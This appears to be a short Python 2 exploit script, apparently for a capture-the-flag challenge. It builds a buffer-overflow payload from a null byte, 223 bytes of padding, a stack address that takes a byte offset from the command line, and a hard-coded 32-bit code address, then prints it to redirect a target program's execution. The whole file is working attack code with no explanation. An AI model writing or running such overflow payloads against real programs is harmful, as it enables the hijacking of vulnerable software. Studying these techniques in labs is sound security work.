import sys
def get_pwn_str(offset):
	return ("y"+chr(0x00)+"a"*223+chr(offset)+chr(0xdb)+chr(0xff)+chr(0xff)+chr(0x93)+chr(0x87)+chr(0x04)+chr(0x08))

if __name__ == '__main__':
	print get_pwn_str(int(sys.argv[1]))

